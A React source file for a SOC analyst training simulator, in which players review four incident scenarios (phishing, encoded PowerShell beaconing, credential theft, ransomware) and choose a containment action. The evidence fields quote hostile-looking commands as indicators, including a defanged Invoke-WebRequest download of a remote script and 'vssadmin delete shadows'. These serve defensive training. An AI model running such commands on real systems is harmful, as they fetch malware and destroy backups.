'use client';

import { cn } from '@/lib/utils';
import { motion } from 'framer-motion';
import { AlertTriangle, Clock3, ShieldCheck, Skull, Trophy, UserRound } from 'lucide-react';
import { useMemo, useState } from 'react';

type Action = 'Ignore' | 'Escalate' | 'Isolate Device' | 'Reset User Password' | 'Block Domain';

type Scenario = {
    id: string;
    title: string;
    severity: 'Low' | 'Medium' | 'High' | 'Critical';
    category: string;
    summary: string;
    timeLimit: number;
    evidence: {
        email?: Record<string, string>;
        endpoint?: Record<string, string | string[]>;
        activity?: Record<string, string | string[]>;
        network?: Record<string, string | string[]>;
    };
    correctAction: Action;
    explanation: string;
};

const scenarios: Scenario[] = [
    {
        id: 'phish_001',
        title: 'Urgent Payroll Update',
        severity: 'Medium',
        category: 'Phishing',
        summary: 'Employee received a payroll update request from an external typosquatted domain.',
        timeLimit: 65,
        evidence: {
            email: {
                from: 'payroll@companny-payroll.com',
                subject: 'Urgent: Confirm payroll details now',
                link: 'http://companny-payroll-secure.com/login',
                attachment: 'Payroll_Update.pdf.exe',
            },
            endpoint: {
                hostname: 'HR-LT-22',
                user: 'sara',
                processes: ['outlook.exe', 'chrome.exe'],
            },
        },
        correctAction: 'Block Domain',
        explanation: 'Domain typosquatting + executable disguised as PDF indicate a phishing campaign.',
    },
    {
        id: 'mal_002',
        title: 'Suspicious PowerShell Burst',
        severity: 'High',
        category: 'Malware Execution',
        summary: 'Endpoint spawned encoded PowerShell command followed by outbound beaconing.',
        timeLimit: 55,
        evidence: {
            endpoint: {
                hostname: 'FIN-WS-08',
                user: 'majed',
                processes: ['winword.exe', 'powershell.exe -enc ...', 'rundll32.exe'],
                commands: ['Invoke-WebRequest hxxp://update-portal-help.net/a.ps1'],
            },
            network: {
                destination: '185.199.110.4:443',
                pattern: '30-second periodic beacon',
            },
        },
        correctAction: 'Isolate Device',
        explanation: 'Likely active malware. Containment first prevents spread while investigation continues.',
    },
    {
        id: 'cred_003',
        title: 'Impossible Travel Login',
        severity: 'High',
        category: 'Credential Theft',
        summary: 'Same account logged in from UAE and Germany within 9 minutes, with MFA failures.',
        timeLimit: 50,
        evidence: {
            activity: {
                user: 'noura',
                logins: ['UAE 09:10', 'Germany 09:19'],
                mfa: '5 failed MFA prompts before success',
            },
            network: {
                sourceIPs: ['5.32.11.40', '87.122.41.9'],
            },
        },
        correctAction: 'Reset User Password',
        explanation: 'This pattern strongly suggests compromised credentials; account recovery is the priority.',
    },
    {
        id: 'ran_004',
        title: 'Early Ransomware Indicators',
        severity: 'Critical',
        category: 'Ransomware Warning',
        summary: 'Mass file renames + shadow copy manipulation started on a finance file server.',
        timeLimit: 45,
        evidence: {
            endpoint: {
                hostname: 'FS-FIN-01',
                processes: ['vssadmin.exe delete shadows', 'encryptor.tmp'],
                fileChanges: ['2,413 files renamed in 4 minutes'],
            },
            activity: {
                notes: 'README_RECOVER_FILES.txt dropped in 17 directories',
            },
        },
        correctAction: 'Isolate Device',
        explanation: 'Immediate containment has highest business value during active encryption behavior.',
    },
];

const actions: Action[] = ['Ignore', 'Escalate', 'Isolate Device', 'Reset User Password', 'Block Domain'];

function getSeverityClass(severity: Scenario['severity']) {
    if (severity === 'Critical') return 'bg-danger/20 text-danger border-danger/40';
    if (severity === 'High') return 'bg-warning/20 text-warning border-warning/40';
    if (severity === 'Medium') return 'bg-primary/20 text-primary border-primary/40';
    return 'bg-success/20 text-success border-success/40';
}

function formatEvidence(title: string, value: string | string[]) {
    return (
        <div key={title} className="rounded-lg border border-white/10 bg-white/[0.02] p-3">
            <p className="text-xs uppercase tracking-wide text-muted mb-1">{title}</p>
            {Array.isArray(value) ? (
                <ul className="space-y-1 text-sm text-text/90 list-disc pl-4">
                    {value.map((item) => (
                        <li key={item}>{item}</li>
                    ))}
                </ul>
            ) : (
                <p className="text-sm text-text/90">{value}</p>
            )}
        </div>
    );
}

export default function SocSimulatorPage() {
    const [index, setIndex] = useState(0);
    const [score, setScore] = useState(0);
    const [impact, setImpact] = useState(100);
    const [decisions, setDecisions] = useState<{ scenarioId: string; action: Action; correct: boolean }[]>([]);

    const current = scenarios[index];
    const finished = index >= scenarios.length;

    const accuracy = useMemo(() => {
        if (!decisions.length) return 0;
        const correctCount = decisions.filter((d) => d.correct).length;
        return Math.round((correctCount / decisions.length) * 100);
    }, [decisions]);

    const onAction = (action: Action) => {
        if (!current) return;
        const correct = action === current.correctAction;

        setScore((s) => s + (correct ? 25 : -5));
        setImpact((i) => Math.max(0, i - (correct ? 4 : 18)));
        setDecisions((d) => [...d, { scenarioId: current.id, action, correct }]);
        setIndex((i) => i + 1);
    };

    return (
        <motion.div initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
            <div className="glass-card p-5 flex flex-wrap items-center justify-between gap-4">
                <div>
                    <p className="text-xs uppercase tracking-widest text-muted">SOC Analyst Simulator</p>
                    <h2 className="text-xl font-bold text-text mt-1">Investigate alerts. Balance speed, accuracy, and business impact.</h2>
                </div>
                <div className="flex items-center gap-3 text-sm">
                    <div className="rounded-lg border border-white/10 px-3 py-2">
                        <p className="text-muted text-xs">Score</p>
                        <p className="text-text font-semibold">{score}</p>
                    </div>
                    <div className="rounded-lg border border-white/10 px-3 py-2">
                        <p className="text-muted text-xs">Accuracy</p>
                        <p className="text-text font-semibold">{accuracy}%</p>
                    </div>
                    <div className="rounded-lg border border-white/10 px-3 py-2">
                        <p className="text-muted text-xs">Business Impact</p>
                        <p className="text-text font-semibold">{impact}%</p>
                    </div>
                </div>
            </div>

            {finished ? (
                <div className="glass-card p-8 text-center space-y-3">
                    <Trophy className="w-14 h-14 mx-auto text-warning" />
                    <h3 className="text-xl font-bold text-text">Simulation Completed</h3>
                    <p className="text-sm text-muted">You processed {scenarios.length} incidents with {accuracy}% decision accuracy.</p>
                    <p className="text-sm text-muted">Tip: Replay and try to keep impact above 80% while maintaining high accuracy.</p>
                </div>
            ) : (
                <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                    <div className="xl:col-span-2 space-y-4">
                        <div className="glass-card p-5 space-y-3">
                            <div className="flex flex-wrap items-center gap-2">
                                <p className="text-lg font-semibold text-text">{current.title}</p>
                                <span className={cn('text-xs px-2 py-1 rounded-full border', getSeverityClass(current.severity))}>{current.severity}</span>
                                <span className="text-xs px-2 py-1 rounded-full border border-white/10 text-muted">{current.category}</span>
                            </div>
                            <p className="text-sm text-muted">{current.summary}</p>
                            <div className="flex items-center gap-2 text-warning text-sm">
                                <Clock3 className="w-4 h-4" />
                                SLA: Respond within {current.timeLimit}s
                            </div>
                        </div>

                        <div className="glass-card p-5 space-y-4">
                            <h4 className="text-sm font-semibold text-text">Evidence Console</h4>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                {Object.entries(current.evidence).flatMap(([section, values]) =>
                                    Object.entries(values).map(([title, value]) =>
                                        formatEvidence(`${section} · ${title}`, value)
                                    )
                                )}
                            </div>
                        </div>
                    </div>

                    <div className="glass-card p-5 space-y-3 h-fit">
                        <h4 className="text-sm font-semibold text-text">Decision Bar</h4>
                        <p className="text-xs text-muted">Choose the best containment action. Wrong choices increase operational damage.</p>
                        <div className="space-y-2">
                            {actions.map((action) => (
                                <button
                                    key={action}
                                    onClick={() => onAction(action)}
                                    className="w-full text-left px-3 py-2 rounded-lg border border-white/10 bg-white/[0.02] hover:bg-primary/10 hover:border-primary/30 transition text-sm text-text"
                                >
                                    {action}
                                </button>
                            ))}
                        </div>
                        <div className="pt-2 border-t border-white/10 text-xs text-muted space-y-1">
                            <p className="flex items-center gap-1"><ShieldCheck className="w-3.5 h-3.5 text-success" /> Correct = lower losses</p>
                            <p className="flex items-center gap-1"><AlertTriangle className="w-3.5 h-3.5 text-warning" /> Slow/weak response = spread risk</p>
                            <p className="flex items-center gap-1"><Skull className="w-3.5 h-3.5 text-danger" /> Critical misses can trigger business outage</p>
                        </div>
                    </div>
                </div>
            )}

            <div className="glass-card p-5">
                <h4 className="text-sm font-semibold text-text mb-3">Case Timeline</h4>
                {decisions.length === 0 ? (
                    <p className="text-sm text-muted">No actions yet. Start with the first alert.</p>
                ) : (
                    <div className="space-y-2">
                        {decisions.map((item, i) => (
                            <div key={item.scenarioId} className="flex items-center justify-between rounded-lg border border-white/10 px-3 py-2 text-sm">
                                <div className="flex items-center gap-2 text-text">
                                    <UserRound className="w-4 h-4 text-muted" />
                                    <span>Case {i + 1}: {item.action}</span>
                                </div>
                                <span className={cn('text-xs px-2 py-1 rounded-full', item.correct ? 'bg-success/15 text-success' : 'bg-danger/15 text-danger')}>
                                    {item.correct ? 'Correct' : 'Incorrect'}
                                </span>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </motion.div>
    );
}
